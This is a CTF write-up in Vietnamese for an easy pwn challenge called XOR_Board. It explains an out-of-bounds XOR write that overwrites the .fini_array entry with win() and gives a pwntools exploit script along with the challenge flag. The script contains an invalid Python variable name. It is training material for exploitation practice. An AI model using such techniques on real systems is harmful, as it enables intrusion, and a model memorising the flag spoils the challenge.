# [CTF] - [XOR_Board]

> **Meta Info**
> - **Author:** Hoan (KMA)
> - **Difficulty:** Easy
> - **Flag:** `DH{8475338cdd6114aad8f4c04264f523c3037d245e641118e2a7afe66710f469f4}`

---

## PHẦN 1: PHÂN TÍCH BÀI (Challenge Analysis)

### 1. Thông tin chung & Checksec
- **File nhận được:** `main`, `main.c ` , `flag` 
- **Kết quả checksec:**
  ```bash
      Arch:     amd64-64-little
      RELRO:    No RELRO
      Stack:    Canary found
      NX:       NX enabled
      PIE:      PIE enabled

### 2. Phân tích tĩnh : 
- Mới vô chương trình đã tạo 1 mảng `arr[64]` với phần tử thứ `i` tương ứng với `bit i` bật(1) còn lại tắt (0)
```
    for (int i = 0; i < 64; i++)
        arr[i] = 1ul << i;
```
- Khi chọn `option = 1 ` chương trình sẽ nhảy vào hàm `xor`
```
void xor() {
    int32_t i, j;
    printf("Enter i & j > ");
    scanf("%d%d", &i, &j);
    arr[i] ^= arr[j];
}
```
- Nhập `i` là `index` của `arr` ta cần thay đổi , còn `j` có nghĩa là có thể đảo `bit` thứ `j` của `arr[i]` , ví dụ tại `arr[0] = 0000..001` khi thực hiện `xor()` với lần lượt `i j` là `0 2` -> `arr[0] = 0000..101`, tất cả `bit` đều được giữ nguyên chỉ trừ `bit` thứ `j` bị đảo 
- Chương trình đã cho ta hàm `win` , và nếu nhập khác 1 và 2 khi ở `menu` chương trình sẽ kết thúc 

## PHẦN 2: HƯỚNG VÀ CÁCH GIẢI :
---
### 1. Ý tưởng :
- Đầu tiên chương trình đang muốn ta làm sao mà có thể dùng hàm `xor()` để có thể thay đổi giá trị của 1 hàm nào đó , biến nó thành `win()`sau đó rồi nhảy vào đó 
- Khi mới bắt đâu chạy ta để ý trên `R14` ta có thể thấy 1 con trỏ tên là `.finy_arry` , đang trỏ tới 1 địa chỉ nào đó :
```
 RAX  0x555555555407 (main) ◂— endbr64
 RBX  0x7fffffffde88 —▸ 0x7fffffffe11d ◂— '/home/nguyenngochoan/dreamhack/XOR_Board/deploy/main'
 RCX  0x555555557218 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555551a0 (__do_global_dtors_aux) ◂— endbr64
 RDX  0x7fffffffde98 —▸ 0x7fffffffe152 ◂— 'SHELL=/bin/bash'
 RDI  1
 RSI  0x7fffffffde88 —▸ 0x7fffffffe11d ◂— '/home/nguyenngochoan/dreamhack/XOR_Board/deploy/main'
 R8   0
 R9   0x7ffff7fca380 (_dl_fini) ◂— endbr64
 R10  0x7fffffffda80 ◂— 0x800000
 R11  0x203
 R12  1
 R13  0
 R14  0x555555557218 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555551a0 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x7fffffffdd60 —▸ 0x7fffffffde00 —▸ 0x7fffffffde60 ◂— 0
 RSP  0x7fffffffdd60 —▸ 0x7fffffffde00 —▸ 0x7fffffffde60 ◂— 0
 RIP  0x55555555540f (main+8) ◂— sub rsp, 0x10
``` 
- `.finy_arry` là một mảng chứa các lệnh , nó sẽ được gọi khi chương trình kết thúc , nhiệm vụ của nó là dọn dẹp các biến ,... Khi kết thúc chương trình nhảy tới `0x555555557218 (__do_global_dtors_aux_fini_array_entry)` và đọc và thực thi địa chỉ bên trong nó . 
- Vì thế có lẽ mục tiêu ghi đè của ta sẽ là con trỏ bên trong địa chỉ `.fini_arry` cụ thể là `0x5555555551a0` thành `win()`
- Ở `xor` tác giả khai báo ` int32_t i, j` mà không kiểm tra xem `i` có phải số âm hay vượt ngoài tầm của mảng hay không -> có lỗi `out_of_bound` -> có thể tính `index` giữa `arr` và địa chỉ `.fini_arry` = -85
- Vì cùng địa chỉ base , ta chỉ cần `xor offset` của `win và địa chỉ bên trong của .fini_arry` : 
```
win = 0x13ed
.fini_arry = 0x11a0

diff = .fini_arry^ win 
```
- `Bit` khác sẽ trả về 0 , ngược lại trả về 1 
- Sau đó biến nó thành 1 mảng mà các phần tử sẽ là các vị trí cần đảo bit để thành `win()` :
```
bits_to_flip = [j for j in range(64) if (diff >> j) & 1]
```
-  `for j in range(64): ` Chạy `j` từ `bit` 0 -> 63
- `(diff >> j) & 1 : ` Dịch con số diff sang phải `j` nấc. Lệnh này có tác dụng đẩy bit thứ $j$ về nằm ở vị trí tận cùng bên phải (bit hàng đơn vị).
- `[j for ... if ...] : ` Gom tất cả chỉ số `j` thỏa mãn bit = 1 thành mảng , ví dụ [1 2] 
- Sau khi biết cần những `bit` nào cần đảo ta nhập lần lượt từng bit cần đảo vào chương trình bằng nhiều lần nhập , sau khi đã ghi đè `win()` ta chọn 3 để thoát chương trình -> lấy dc `shell` 

### 2. Kịch bản khai thác : 
```
#!/usr/bin/env python3
from pwn import *

exe = ELF("./main", checksec=False)
context.binary = exe

p = process(exe.path)

gdb.attach(p, gdbscript='''
    b *xor+78
    c
''')

win = 0x13ed
.fini_arry = 0x11a0

diff = .fini_arry^ win 
bits_to_flip = [j for j in range(64) if (diff >> j) & 1]
log.info(f"Các bit j cần lật: {bits_to_flip}")

i = -85
input()
for j in bits_to_flip:
    p.sendlineafter(b"> ", b"1")
    
    payload_line = f"{i} {j}".encode()
    p.sendlineafter(b"Enter i & j > ", payload_line)

p.sendlineafter(b"> ", b"3")


p.interactive()
```
    
